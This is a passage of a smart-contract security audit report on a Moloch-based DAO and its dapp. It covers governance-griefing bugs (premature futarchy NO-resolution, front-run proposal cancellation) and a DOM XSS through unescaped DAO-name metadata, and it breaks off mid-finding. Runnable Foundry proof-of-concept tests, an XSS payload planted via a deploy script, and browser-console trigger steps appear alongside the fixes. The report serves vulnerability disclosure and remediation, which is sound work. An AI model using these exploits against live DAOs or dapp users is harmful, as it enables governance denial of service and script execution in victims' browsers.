- **Potential Follow-On Impact:** Repeated use against new proposal ids can stall routine or emergency governance. If deployments rely on raw summon defaults or later governance sets both quorums to zero, an attacker can keep re-griefing replacement proposals at negligible cost.
- **Confidentiality:** None — the code path does not expose protected data.
- **Integrity:** Low — the attacker can force an unintended NO-resolution workflow and corrupt the intended governance process for a proposal.
- **Availability:** Low — the targeted proposal’s vote/execution path becomes unavailable until a new proposal id is created.

#### Recommended Fix

Block premature NO-resolution from the zero-vote state, and do not let a zero-quorum configuration immediately classify a freshly opened proposal as defeated.

One safe approach is to keep a zero-quorum, zero-vote proposal `Active` until at least one vote has been cast:

```solidity
// Before
if (minYes != 0 && forVotes < minYes) return ProposalState.Defeated;
if (forVotes <= againstVotes) return ProposalState.Defeated;
return ProposalState.Succeeded;
```

```solidity
// After
uint256 totalCast = forVotes + againstVotes + abstainVotes;
if (quorumAbsolute == 0 && quorumBps == 0 && totalCast == 0) {
    return ProposalState.Active;
}

if (minYes != 0 && forVotes < minYes) return ProposalState.Defeated;
if (forVotes <= againstVotes) return ProposalState.Defeated;
return ProposalState.Succeeded;
```

For defense in depth, also harden `resolveFutarchyNo()` so it cannot finalize a NO side before any voting signal exists:

```solidity
function resolveFutarchyNo(uint256 id) public {
    FutarchyConfig storage F = futarchy[id];
    if (!F.enabled || F.resolved || executed[id]) revert NotOk();

    Tally storage t = tallies[id];
    if (t.forVotes + t.againstVotes + t.abstainVotes == 0) revert NotOk();

    ProposalState st = state(id);
    if (st != ProposalState.Defeated && st != ProposalState.Expired) revert NotOk();

    _finalizeFutarchy(id, F, 0);
}
```

##### Security Principle
Irreversible workflow transitions must require an initialized, meaningful state. A governance proposal should not become finalizable on the NO side until the protocol has observed at least some legitimate voting signal or an explicit governance-approved futarchy configuration that safely defines zero-vote behavior.

##### Defense in Depth
- Disallow enabling futarchy on proposals unless the DAO has opted into futarchy for that proposal or globally configured a safe futarchy mode.
- Enforce a non-zero quorum invariant whenever futarchy can be enabled, including raw summon/init paths and later DAO self-calls that modify quorum settings.

##### Verification Guidance
- Add a regression test where `quorumBps == 0` and `quorumAbsolute == 0`: after `fundFutarchy()` on an unopened proposal with zero tallies, `resolveFutarchyNo()` must revert until at least one vote exists.
- Add a regression test proving that legitimate zero-quorum proposals still work once a real vote is cast (e.g. one FOR vote can still make the proposal succeed if that governance mode is desired).
- Add a regression test for auto-futarchy confirming that opening a proposal does not make it immediately NO-resolvable at zero votes.

#### Reproduction

##### Environment
- **OS:** any
- **Dependencies:**
```bash
curl -L https://foundry.paradigm.xyz | bash
foundryup
```
- **Target Setup:**
```bash
cd "$(git rev-parse --show-toplevel)"
forge build
```

##### Runnable PoC
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Renderer} from "../src/Renderer.sol";
import {Call, Moloch, Summoner} from "../src/Moloch.sol";

contract Target {
    uint256 public value;
    function setValue(uint256 v) external { value = v; }
}

contract PrematureNoResolutionPoC is Test {
    Summoner internal summoner;
    Moloch internal dao;
    Target internal target;

    address internal alice = address(0xA11CE);
    address internal attacker = address(0xB0B);

    function setUp() public {
        summoner = new Summoner();
        target = new Target();
        vm.deal(alice, 1 ether);

        address[] memory holders = new address[](2);
        holders[0] = alice;
        holders[1] = attacker;

        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 100e18;
        amounts[1] = 1e18;

        dao = summoner.summon(
            "ZeroQuorumDAO",
            "ZQ",
            "",
            0,
            false,
            address(new Renderer()),
            bytes32("poc"),
            holders,
            amounts,
            new Call[](0)
        );

        vm.roll(block.number + 1);
    }

    function test_PrematureNoResolutionFreezesProposal() public {
        bytes memory data = abi.encodeWithSelector(Target.setValue.selector, 123);
        uint256 id = dao.proposalId(0, address(target), 0, data, bytes32(0));

        vm.prank(attacker);
        dao.castVote(id, 0);

        vm.prank(alice);
        dao.fundFutarchy{value: 1 ether}(id, address(0), 1 ether);

        dao.resolveFutarchyNo(id);

        vm.prank(alice);
        vm.expectRevert();
        dao.castVote(id, 1);
    }
}
```

##### Steps
1. **Save the PoC as a Foundry test**
```bash
cat > test/PrematureNoResolutionPoC.t.sol <<'EOF'
[PASTE THE FULL TEST ABOVE]
EOF
```
- Expected: the repository still compiles.
2. **Run the PoC**
```bash
forge test --match-test test_PrematureNoResolutionFreezesProposal -vv
```
- Expected: the test passes and shows the proposal becomes frozen after premature NO-resolution.

##### Verification
Confirm that the attacker can open the proposal implicitly by voting NO with dust weight, that `resolveFutarchyNo(id)` succeeds after public futarchy funding, and that the final `castVote(id, 1)` call reverts because the proposal is already futarchy-resolved.

##### Outcome
A public attacker can trigger premature NO-resolution in a zero-quorum deployment and permanently freeze further voting on that proposal id.

</details>

---

<details>
<summary><strong>17. Zero-threshold proposal opening lets first caller tombstone a proposal ID before votes</strong></summary>

> **Review: Variant of KF#11 (same root cause as #11). Severity adjusted to Low.** See #11 review. Same proposal-ID tombstoning / front-run cancel class. Sharper framing but same root cause and same mitigations (atomic open+vote via `multicall`, `proposalThreshold > 0`, SafeSummoner enforcement). **Severity: Low (per KF#11, configuration-dependent).**

**Winfunc ID:** `24`

**CVSS Score:** `6.5`

**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L`

**Vulnerability Type:** `CWE-285: Improper Authorization`

**Source Location:** `src/Moloch.sol:278:openProposal()`

**Sink Location:** `src/Moloch.sol:429:cancelProposal()`

#### Summary

An attacker can front-run proposal opening in a zero-threshold Moloch deployment, leading to permanent tombstoning of the targeted governance intent.

#### Root Cause

`openProposal()` records `proposerOf[id] = msg.sender` for the first opener of a proposal id, and its only proposer-eligibility check is skipped entirely when `proposalThreshold == 0` (`src/Moloch.sol:283-300`). `cancelProposal()` then authorizes solely on `proposerOf[id]` and writes `executed[id] = true` (`src/Moloch.sol:420-429`), with no recovery path; later `castVote()` and `executeByVotes()` both honor that latch and reject the proposal.

#### Impact

###### Confirmed Impact
For affected deployments, any attacker who gets an `openProposal(id)` transaction in first can immediately cancel the same id before votes or futarchy funding arrive, permanently preventing that exact governance intent hash from being voted through or executed.

###### Potential Follow-On Impact
A proposer can reissue the same action under a fresh nonce, so this is not a universal governance brick by itself. However, repeated mempool front-runs against time-sensitive treasury or rollback actions can delay governance, force repeated re-proposals, and create a practical denial-of-service window for operationally urgent actions.

#### Source-to-Sink Trace

1. **[src/Moloch.sol:278](../src/Moloch.sol#L278)**

   ```solidity
   function openProposal(uint256 id) public {
   ```

   A public caller supplies or copies the target proposal id and can race to be the first opener.

2. **[src/Moloch.sol:283](../src/Moloch.sol#L283)**

   ```solidity
   if (threshold != 0) { require(_shares.getVotes(msg.sender) >= threshold, Unauthorized()); }
   ```

   The only creator-authorization check is conditional. When `proposalThreshold == 0`, any address passes this stage without holding governance power.

3. **[src/Moloch.sol:299](../src/Moloch.sol#L299)**

   ```solidity
   proposalIds.push(id); proposerOf[id] = msg.sender;
   ```

   The first opener permanently claims proposer ownership for the id.

4. **[src/Moloch.sol:420](../src/Moloch.sol#L420)**

   ```solidity
   require(msg.sender == proposerOf[id], Unauthorized());
   ```

   Cancellation authority is derived solely from the stored proposer address claimed in `openProposal()`.

5. **[src/Moloch.sol:429](../src/Moloch.sol#L429)**

   ```solidity
   executed[id] = true; // tombstone intent id
   ```

   The attacker-proposer irreversibly tombstones the proposal id before any honest vote lands.

#### Exploit Analysis

##### Attack Narrative
The attacker watches the public mempool for the first `openProposal(id)` or `castVote(id, support)` transaction referencing a proposal id in a DAO whose `proposalThreshold` was left at zero. Because `openProposal()` only takes the precomputed id, the attacker does not need the full proposal calldata or nonce once that first governance transaction is public; copying the id is enough.

The attacker submits two cheap transactions ahead of the honest one: first `openProposal(id)` to become `proposerOf[id]`, then `cancelProposal(id)` before any votes or futarchy funding land. That second call sets `executed[id] = true`, after which `castVote()` and `executeByVotes()` reject the proposal permanently. The proposer can create a fresh proposal id with a new nonce, but the attacker can repeat the same suppression tactic against each new attempt.

##### Prerequisites
- **Attacker Control/Position:** The attacker controls any EOA or contract account and can observe or anticipate the target proposal id.
- **Required Access/Placement:** Unauthenticated / public-network participant.
- **User Interaction:** None.
- **Privileges/Configuration Required:** The DAO must be deployed with `proposalThreshold == 0`. For `cancelProposal()` to succeed immediately after opening, the proposal must still be `Active` at zero votes (for example, because `quorumBps > 0` or `quorumAbsolute > 0`) and there must be no nonzero futarchy pool yet. The first-party dapp makes this reachable by treating proposal threshold as optional, defaulting quorum to 50%, and only encoding `setProposalThreshold` when the user supplies a positive value.
- **Knowledge Required:** The target proposal id from a pending `openProposal`/`castVote` transaction or from off-chain proposal coordination.
- **Attack Complexity:** Low — the attacker only needs to front-run with higher-fee transactions; no cryptographic break, flash loan, or special token behavior is required.

##### Attack Steps
1. Identify a zero-threshold DAO deployment or deploy one through the raw Summoner / first-party dapp path.
2. Observe a pending governance transaction containing the target proposal id, or otherwise learn the id off-chain.
3. Submit `openProposal(id)` before the legitimate proposer/voter so `proposerOf[id]` is set to the attacker.
4. Immediately submit `cancelProposal(id)` before any vote or futarchy-funding transaction is included.
5. The honest `castVote()` or later `executeByVotes()` attempt fails because the proposal id is already tombstoned.

##### Impact Breakdown
- **Confirmed Impact:** Permanent denial of service for the targeted proposal id; it cannot be voted through or executed once `executed[id]` is set.
- **Potential Follow-On Impact:** Repeated suppression can delay time-sensitive governance actions, including treasury moves or emergency responses, if the attacker continues to win the race on each replacement proposal.
- **Confidentiality:** None — the path does not expose protected data.
- **Integrity:** Low — an unauthorized party can alter governance state by claiming proposer status and cancelling an intent they did not originate.
- **Availability:** Low — the specific proposal id is permanently disabled and governance participants must restart with a new nonce.

#### Recommended Fix

Enforce a non-zero proposal threshold in the core deployment/configuration path instead of relying only on `SafeSummoner` or frontend behavior. The current setter allows zero and the raw Summoner / dapp flow can leave the threshold unset, which makes proposer ownership depend on mempool ordering.

**Before:**
```solidity
function setProposalThreshold(uint96 v) public payable onlyDAO {
    proposalThreshold = v;
}
```

**After:**
```solidity
error ProposalThresholdRequired();

function setProposalThreshold(uint96 v) public payable onlyDAO {
    if (v == 0) revert ProposalThresholdRequired();
    proposalThreshold = v;
}
```

In addition, ensure raw deployments always initialize a positive threshold instead of silently omitting the init call.

**Before (frontend/raw init path):**
```javascript
if (proposalThresholdWei > 0n) {
  initCalls.push({
    target: predictedDao,
    value: 0n,
    data: INTERFACES.setProposalThreshold.encodeFunctionData(
      'setProposalThreshold',
      [proposalThresholdWei]
    )
  });
}
```

**After:**
```javascript
const effectiveThreshold = proposalThresholdWei > 0n
  ? proposalThresholdWei
  : ethers.parseEther('1'); // or a safer % of initial supply

initCalls.push({
  target: predictedDao,
  value: 0n,
  data: INTERFACES.setProposalThreshold.encodeFunctionData(
    'setProposalThreshold',
    [effectiveThreshold]
  )
});
```

##### Security Principle
Proposal creation must be bound to a scarce governance resource rather than to “whoever got the first transaction mined.” Requiring non-zero stake for proposal opening prevents arbitrary third parties from claiming proposer-linked capabilities such as cancellation.

##### Defense in Depth
- Route all production deployments through `SafeSummoner.safeSummon()` and remove the zero-threshold option from first-party UIs.
- Add deployment-time validation that rejects `proposalThreshold == 0` in any raw summon or admin configuration flow.
- If zero-threshold proposal opening must remain supported for a niche use case, redesign cancellation so it is not keyed solely to the first opener (for example, require a proposer signature or separate governance approval for cancellation).

##### Verification Guidance
- Add a regression test proving that a DAO cannot be deployed or configured with `proposalThreshold == 0`.
- Add a test showing that an attacker without the required threshold cannot become `proposerOf[id]` by front-running `openProposal(id)`.
- Add a test proving legitimate proposal creation/cancellation still works when the proposer meets the positive threshold.
- Validate the first-party dapp or deployment scripts always include a non-zero `setProposalThreshold` init call.

#### Reproduction

##### Environment
- **OS:** any
- **Dependencies:**
```bash
curl -L https://foundry.paradigm.xyz | bash
foundryup
```
- **Target Setup:**
```bash
cd "$(git rev-parse --show-toplevel)"
forge build
```

##### Runnable PoC
Save the following as `test/ZeroThresholdFrontRunCancelPoC.t.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import {Summoner, Moloch, Call} from "../src/Moloch.sol";

contract Target {
    uint256 public value;
    function setValue(uint256 v) external { value = v; }
}

contract ZeroThresholdFrontRunCancelPoC is Test {
    Summoner internal summoner;
    Moloch internal dao;
    Target internal target;

    address internal alice = address(0xA11CE);
    address internal bob = address(0xB0B);
    address internal attacker = address(0xBAD);

    function setUp() public {
        summoner = new Summoner();
        target = new Target();

        address[] memory holders = new address[](2);
        holders[0] = alice;
        holders[1] = bob;

        uint256[] memory shares = new uint256[](2);
        shares[0] = 60e18;
        shares[1] = 40e18;

        // No initCall sets proposalThreshold, so it stays at 0.
        Call[] memory initCalls = new Call[](0);

        dao = summoner.summon(
            "ZeroThresholdDAO",
            "ZTD",
            "",
            5000, // 50% quorum => a freshly opened zero-vote proposal is Active
            false,
            address(0),
            bytes32("salt"),
            holders,
            shares,
            initCalls
        );

        assertEq(dao.proposalThreshold(), 0);
        assertEq(dao.quorumBps(), 5000);
    }

    function test_frontRunOpenAndCancelTombstonesProposal() public {
        // Ensure the proposal snapshot looks at a block after deployment checkpoints exist.
        vm.roll(block.number + 1);

        bytes memory data = abi.encodeWithSelector(Target.setValue.selector, 123);
        uint256 id = dao.proposalId(0, address(target), 0, data, bytes32("nonce"));

        // Attacker front-runs the honest first open/vote and becomes proposerOf[id].
        vm.prank(attacker);
        dao.openProposal(id);
        assertEq(dao.proposerOf(id), attacker);

        // Because the proposal is still Active, has no votes, and has no futarchy pool,
        // the attacker can immediately tombstone it.
        vm.prank(attacker);
        dao.cancelProposal(id);
        assertTrue(dao.executed(id));

        // Honest governance participants can no longer vote the proposal.
        vm.prank(alice);
        vm.expectRevert(abi.encodeWithSignature("AlreadyExecuted()"));
        dao.castVote(id, 1);
    }
}
```

##### Steps
1. **Run the proof of concept**
```bash
forge test --match-path test/ZeroThresholdFrontRunCancelPoC.t.sol -vv
```
- Expected: the test passes, proving an attacker can claim `proposerOf[id]`, cancel the proposal, and make later voting revert.

2. **Inspect the relevant state changes**
- Expected: `dao.proposerOf(id)` is the attacker address and `dao.executed(id)` is `true` before any honest vote is cast.

##### Verification
Confirm that the final `castVote(id, 1)` call reverts with `AlreadyExecuted()`. This demonstrates that the proposal id has been permanently tombstoned and can no longer proceed through the normal voting/execution path.

##### Outcome
The attacker does not gain direct treasury control, but they do gain the ability to suppress a specific proposal intent hash in a misconfigured zero-threshold deployment. The legitimate proposer must generate a new nonce and restart governance from scratch, and the attacker can repeat the maneuver on subsequent attempts if they continue to win the mempool race.

</details>

---

<details>
<summary><strong>18. Default DAO contractURI metadata can trigger DOM XSS in the dapp modal</strong></summary>

> **Review: Duplicate of Cantina XSS class. Already patched in demo dapp.** Same `innerHTML`-with-untrusted-metadata root cause first identified by Cantina Apex (MAJEUR-5, MAJEUR-3, MAJEUR-4, etc.). New DOM sink instance but same root cause. The systematic `innerHTML` → `textContent`/DOM API pass has been applied to the demo dapp. Not a smart contract finding — dapp-layer only. **Severity: Medium (frontend, patched).**

**Winfunc ID:** `5`

**CVSS Score:** `6.1`

**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`

**Vulnerability Type:** `CWE-79: Cross-site Scripting`

**Source Location:** `src/Moloch.sol:2066:Summoner.summon()`

**Sink Location:** `dapp/Majeur.html:22059:openNFTModal()`

#### Summary

An attacker can publish a DAO whose default `contractURI` metadata carries HTML in the DAO name, which the Majeur dapp later injects into its NFT modal, leading to arbitrary script execution in a visitor’s browser.

#### Root Cause

`Summoner.summon()` and `Moloch.init()` accept and persist an arbitrary `orgName`, and `Renderer.daoContractURI()` later feeds the raw `dao.name(0)` into `Display.jsonImage(...)` without JSON escaping. Separately, `dapp/Majeur.html` parses that metadata and `openNFTModal()` interpolates `metadata.name` and `metadata.description` directly into `innerHTML` without using the existing `escapeHtml()` helper.

#### Impact

###### Confirmed Impact
A malicious DAO creator can set `orgName` to an HTML payload such as `<img src=x onerror=alert(1)>`; when a user opens the DAO emblem modal in the public dapp, the payload executes in the dapp origin. This same encoding flaw also allows quote/backslash/control-character names to break the generated ERC-7572 JSON metadata.

###### Potential Follow-On Impact
Once script runs in the dapp origin, the attacker may be able to manipulate wallet-facing UI, trigger misleading transaction prompts, read or alter same-origin application state such as cached drafts, or suppress the covenant/metadata display. These follow-on effects depend on what the victim does after the injected script executes and on browser/wallet behavior.

#### Source-to-Sink Trace

1. **[src/Moloch.sol:2066](../src/Moloch.sol#L2066)**

   ```solidity
   function summon(string calldata orgName, string calldata orgSymbol, string calldata orgURI, ... )
   ```

   Untrusted attacker-controlled DAO metadata enters through the public DAO creation flow.

2. **[src/Moloch.sol:223](../src/Moloch.sol#L223)**

   ```solidity
   _orgName = orgName;
   ```

   The DAO stores the attacker-controlled organization name verbatim without validation or normalization.

3. **[src/Moloch.sol:1023](../src/Moloch.sol#L1023)**

   ```solidity
   return IMajeurRenderer(_r).daoContractURI(this);
   ```

   When `_orgURI` is empty, the default contractURI path forwards metadata generation to the renderer.

4. **[src/Renderer.sol:65](../src/Renderer.sol#L65)**

   ```solidity
   string memory rawOrgName = dao.name(0); ... return Display.jsonImage(string.concat(bytes(rawOrgName).length != 0 ? rawOrgName : "UNNAMED DAO", " DUNA Covenant"), ...);
   ```

   The renderer reads the raw DAO name and passes it into JSON generation; the SVG path uses `Display.esc(...)`, but the JSON path uses the unescaped raw string.

5. **[src/Renderer.sol:642](../src/Renderer.sol#L642)**

   ```solidity
   string.concat('{"name":"', name_, '","description":"', description_, '","image":"', svgDataURI(svg_), '"}')
   ```

   `Display.jsonImage()` concatenates the tainted name directly into JSON without JSON escaping.

6. **[dapp/Majeur.html:21921](../dapp/Majeur.html#L21921)**

   ```solidity
   const json = atob(contractURI.slice(29)); metadata = JSON.parse(json);
   ```

   The public dapp decodes and parses the attacker-controlled contractURI metadata.

7. **[dapp/Majeur.html:22059](../dapp/Majeur.html#L22059)**

   ```solidity
   modalBody.innerHTML = `... <div class="nft-modal-title">${metadata.name || title}</div> ...`;
   ```

   SINK: parsed metadata fields are inserted into `innerHTML` without `escapeHtml()`, allowing attacker HTML from the DAO name to execute in the browser.

#### Exploit Analysis

##### Attack Narrative
The attacker is a public user who creates a DAO with a malicious organization name. The protocol’s default renderer is expected to generate safe metadata when `_orgURI` is empty, but it serializes the raw DAO name into JSON and the frontend later trusts that metadata enough to insert `metadata.name` into `innerHTML`.

When a victim views the DAO in the public dapp and opens the emblem modal, the browser interprets the attacker-supplied HTML as live DOM content. The exploit does not require malformed JSON, duplicate keys, or browser quirks: a simple HTML payload like `<img src=x onerror=alert(1)>` survives JSON parsing and reaches the sink unchanged.

##### Prerequisites
- **Attacker Control/Position:** Attacker controls the DAO name at creation time, or later controls DAO governance enough to call `setMetadata(..., ..., "")` with a malicious name while keeping the default renderer path active
- **Required Access/Placement:** Unauthenticated public user for new DAO creation; otherwise governance control of an existing DAO
- **User Interaction:** Required — the victim must open the malicious DAO in the dapp and trigger the emblem modal (or otherwise reach `openNFTModal()` with that metadata)
- **Privileges/Configuration Required:** The DAO must use the default `contractURI` path (`_orgURI == ""`) and the victim must use the public Majeur frontend
- **Knowledge Required:** The attacker needs to know that the public dapp renders DAO metadata via `openNFTModal()`
- **Attack Complexity:** Low — the payload is a plain HTML tag and the source-to-sink path is deterministic

##### Attack Steps
1. Call `Summoner.summon()` with `orgName` set to an HTML payload and `orgURI` set to the empty string.
2. Let the victim browse to the malicious DAO in `dapp/Majeur.html`.
3. The frontend calls `contractURI()`, base64-decodes the JSON, and parses it into `metadata`.
4. When the victim opens the DAO emblem modal, `openNFTModal()` writes `${metadata.name}` into `modalBody.innerHTML`.
5. The browser executes the injected HTML/JavaScript in the dapp origin.

##### Impact Breakdown
- **Confirmed Impact:** Arbitrary JavaScript execution in the public dapp origin for users who open the malicious DAO’s modal.
- **Potential Follow-On Impact:** The injected script may manipulate wallet-facing UI, alter same-origin application state, or prompt misleading actions; any actual on-chain transaction still depends on wallet confirmation and victim follow-through.
- **Confidentiality:** Low — script can read same-origin page state and locally stored drafts available to the dapp.
- **Integrity:** Low — script can alter rendered content and influence wallet interactions within the page.
- **Availability:** None — the demonstrated exploit does not need to deny service, though malformed metadata can also suppress rendering paths.

#### Recommended Fix

Apply output encoding at both trust boundaries: JSON serialization in `Renderer.sol` and DOM rendering in `dapp/Majeur.html`.

Before:
```solidity
return jsonDataURI(
    string.concat(
        '{"name":"',
        name_,
        '","description":"',
        description_,
        '","image":"',
        svgDataURI(svg_),
        '"}'
    )
);
```

After:
```solidity
function jsonEscape(string memory s) internal pure returns (string memory) {
    bytes memory inBytes = bytes(s);
    bytes memory out = new bytes(inBytes.length * 6);
    uint256 o;
    for (uint256 i; i < inBytes.length; ++i) {
        bytes1 c = inBytes[i];
        if (c == '"') { out[o++] = '\\'; out[o++] = '"'; }
        else if (c == '\\') { out[o++] = '\\'; out[o++] = '\\'; }
        else if (uint8(c) < 0x20) {
            bytes memory esc = bytes(string.concat('\\u00', _hex(uint8(c) >> 4), _hex(uint8(c) & 0x0f)));
            for (uint256 j; j < esc.length; ++j) out[o++] = esc[j];
        } else {
            out[o++] = c;
        }
    }
    assembly { mstore(out, o) }
    return string(out);
}

return jsonDataURI(
    string.concat(
        '{"name":"',
        jsonEscape(name_),
        '","description":"',
        jsonEscape(description_),
        '","image":"',
        jsonEscape(svgDataURI(svg_)),
        '"}'
    )
);
```

Before:
```js
modalBody.innerHTML = `
  ${imageHTML}
  <div class="nft-modal-title">${metadata.name || title}</div>
  ${metadata.description ? `<div class="nft-modal-description">${metadata.description}</div>` : ''}
  ${attributesHTML}
  ${futarchyClaimHTML}
`;
```

After:
```js
modalBody.innerHTML = `
  ${imageHTML}
  <div class="nft-modal-title">${escapeHtml(metadata.name || title)}</div>
  ${metadata.description ? `<div class="nft-modal-description">${escapeHtml(metadata.description)}</div>` : ''}
  ${attributesHTML}
  ${futarchyClaimHTML}
`;
```

##### Security Principle
Each layer must encode untrusted data for its immediate consumer: JSON values must be JSON-escaped before serialization, and strings inserted into HTML must be HTML-escaped before reaching `innerHTML`. Relying on SVG escaping for later JSON/DOM consumers breaks contextual output encoding and leaves downstream sinks exploitable.

##### Defense in Depth
- Replace string-built HTML with `textContent`/`createElement` for metadata title, description, and attribute values instead of concatenating untrusted strings into `innerHTML`.
- Add negative tests covering DAO names containing `<`, `>`, `&`, quotes, backslashes, and ASCII control characters for both renderer output and frontend modal rendering.

##### Verification Guidance
- Add a regression test proving that `contractURI()` remains valid JSON when `orgName` contains quotes, backslashes, and control characters.
- Add a frontend regression test proving that a DAO name like `<img src=x onerror=alert(1)>` renders as literal text in the modal and does not execute.
- Add a UI test confirming legitimate SVG/image rendering still works for normal DAO names and metadata.

#### Reproduction

##### Environment
- **OS:** any
- **Dependencies:**
  ```bash
  foundryup
  python3 -m pip install --user httpserver
  ```
- **Target Setup:**
  ```bash
  anvil
  python3 -m http.server 8000
  ```

##### Runnable PoC
Because the vulnerable sink is in the static dapp, the smallest practical reproduction is a local DAO deployment plus a browser-console trigger against the real `openNFTModal()` code.

```solidity
// script/MetadataXSSPoC.s.sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "forge-std/Script.sol";
import "forge-std/console2.sol";
import {Renderer} from "../src/Renderer.sol";
import {Summoner, Moloch, Call} from "../src/Moloch.sol";

contract MetadataXSSPoC is Script {
    function run() external {
        uint256 pk = vm.envUint("PRIVATE_KEY");
        address attacker = vm.addr(pk);

        vm.startBroadcast(pk);
        Renderer renderer = new Renderer();
        Summoner summoner = new Summoner();

        address[] memory holders = new address[](1);
        holders[0] = attacker;

        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 1e18;

        Call[] memory initCalls = new Call[](0);

        Moloch dao = summoner.summon(
            "<img src=x onerror=alert(document.domain)>",
            "XSS",
            "",
            5000,
            true,
            address(renderer),
            bytes32(0),
            holders,
            amounts,
            initCalls
        );

        console2.log("DAO", address(dao));
        console2.log("contractURI", dao.contractURI());
        vm.stopBroadcast();
    }
}
```

##### Steps
1. **Start a local chain and deploy the malicious DAO**
   ```bash
   export PRIVATE_KEY=0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80
   forge script script/MetadataXSSPoC.s.sol:MetadataXSSPoC \
     --rpc-url http://127.0.0.1:8545 \
     --private-key $PRIVATE_KEY \
     --broadcast
   ```
   - Expected: the script prints a deployed DAO address and a `data:application/json;base64,...` `contractURI`.

2. **Open the real dapp page**
   ```text
   http://127.0.0.1:8000/dapp/Majeur.html
   ```
   - Expected: the Majeur dapp loads in the browser.

3. **In the browser console, fetch the malicious metadata and invoke the real modal sink**
   ```js
   const dao = "PASTE_DEPLOYED_DAO_ADDRESS_HERE";
   const provider = new ethers.JsonRpcProvider("http://127.0.0.1:8545");
   const abi = ["function contractURI() view returns (string)"];
   const contractURI = await new ethers.Contract(dao, abi, provider).contractURI();
   const metadata = JSON.parse(atob(contractURI.slice(29)));
   openNFTModal({ ...metadata, image: metadata.image }, "DAO Contract");
   ```
   - Expected: an alert box appears as soon as the modal is rendered.

##### Verification
Confirm that the alert fires from the payload embedded in the on-chain DAO name and that the modal title area contains the injected HTML instead of inert text.

##### Outcome
The attacker gains arbitrary JavaScript execution in the Majeur dapp origin for users who open the malicious DAO’s modal, enabling UI manipulation and wallet-targeted phishing actions within that origin.

</details>

---

<details>
<summary><strong>19. Renderer-generated DAO contract metadata name can trigger XSS in the official dapp modal</strong></summary>

> **Review: Duplicate of Cantina XSS class (same root cause as #18). Already patched in demo dapp.** Different DOM sink, same `innerHTML` root cause. See #18 review. **Severity: Medium (frontend, patched).**

**Winfunc ID:** `10`

**CVSS Score:** `6.1`

**CVSS Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:L`

**Vulnerability Type:** `CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')`

**Source Location:** `src/Moloch.sol:2066:Summoner.summon()`

**Sink Location:** `dapp/Majeur.html:22059:openNFTModal()`

#### Summary

An attacker can publish a DAO whose renderer-generated contract metadata name contains active HTML, leading to script execution in the official dapp origin when a user views that DAO’s contract metadata modal.

#### Root Cause

`Renderer.daoContractURI()` reads `rawOrgName = dao.name(0)` and ultimately passes that raw value into `Display.jsonImage()` as the JSON `name` field. `Display.jsonImage()` at `src/Renderer.sol:637-651` builds JSON by string concatenation without escaping quotes, backslashes, or HTML-significant characters, and the only escaping present in this file (`Display.esc()`) is applied to SVG text contexts, not to the metadata JSON.

#### Impact

###### Confirmed Impact
A malicious DAO name such as `<img src=x onerror=alert(document.domain)>` survives into `contractURI` metadata, is base64-decoded and `JSON.parse`d by `dapp/Majeur.html`, and is then inserted into `openNFTModal()` via `innerHTML`. This yields DOM XSS on the official dapp origin when a victim opens the malicious DAO and triggers the metadata modal.

###### Potential Follow-On Impact
Injected script can alter the dapp DOM, spoof transaction prompts, read non-secret state available to page JavaScript, and abuse any trusted UI flows reachable from the compromised origin. Names containing JSON-breaking characters such as unescaped `"` or `\` can also corrupt the emitted metadata and cause metadata rendering failures in the dapp or other consumers, although the exact downstream availability impact depends on each integrator's error handling.

#### Source-to-Sink Trace

1. **[src/Moloch.sol:2066](../src/Moloch.sol#L2066)**

   ```solidity
   function summon(string calldata orgName, ... ) public payable returns (Moloch dao)
   ```

   The attacker supplies an arbitrary DAO name when creating a DAO through the public summoning flow.

2. **[src/Moloch.sol:223](../src/Moloch.sol#L223)**

   ```solidity
   _orgName = orgName;
   ```

   The untrusted name is stored in DAO metadata state during initialization.

3. **[src/Moloch.sol:1023](../src/Moloch.sol#L1023)**

   ```solidity
   return IMajeurRenderer(_r).daoContractURI(this);
   ```

   If no custom `orgURI` is set, the DAO's public `contractURI()` delegates to the renderer output.

4. **[src/Renderer.sol:65](../src/Renderer.sol#L65)**

   ```solidity
   string memory rawOrgName = dao.name(0);
   ```

   `daoContractURI()` retrieves the attacker-controlled DAO name as raw metadata input.

5. **[src/Renderer.sol:224](../src/Renderer.sol#L224)**

   ```solidity
   return Display.jsonImage(string.concat(bytes(rawOrgName).length != 0 ? rawOrgName : "UNNAMED DAO", " DUNA Covenant"), ...);
   ```

   The raw DAO name is forwarded into the metadata `name` field instead of the SVG-escaped variant.

6. **[src/Renderer.sol:642](../src/Renderer.sol#L642)**

   ```solidity
   string.concat('{"name":"', name_, '","description":"', description_, '","image":"', svgDataURI(svg_), '"}')
   ```

   `jsonImage()` serializes JSON by raw concatenation and performs no JSON escaping on `name_` or `description_`.

7. **[dapp/Majeur.html:21921](../dapp/Majeur.html#L21921)**

   ```solidity
   const json = atob(contractURI.slice(29)); metadata = JSON.parse(json);
   ```

   The official dapp decodes the renderer output and preserves the attacker-controlled HTML in `metadata.name`.

8. **[dapp/Majeur.html:21983](../dapp/Majeur.html#L21983)**

   ```solidity
   emblem.onclick = () => openNFTModal(metadata, 'DAO Contract');
   ```

   Viewing the malicious DAO and clicking the contract/emblem modal routes the parsed metadata into the display sink.

9. **[dapp/Majeur.html:22059](../dapp/Majeur.html#L22059)**

   ```solidity
   modalBody.innerHTML = `${imageHTML}<div class="nft-modal-title">${metadata.name || title}</div>${metadata.description ? `<div class="nft-modal-description">${metadata.description}</div>` : ''}`;
   ```

   The dapp inserts `metadata.name` directly into `innerHTML`, so browser HTML parsing executes the payload on the dapp origin.

#### Exploit Analysis

##### Attack Narrative
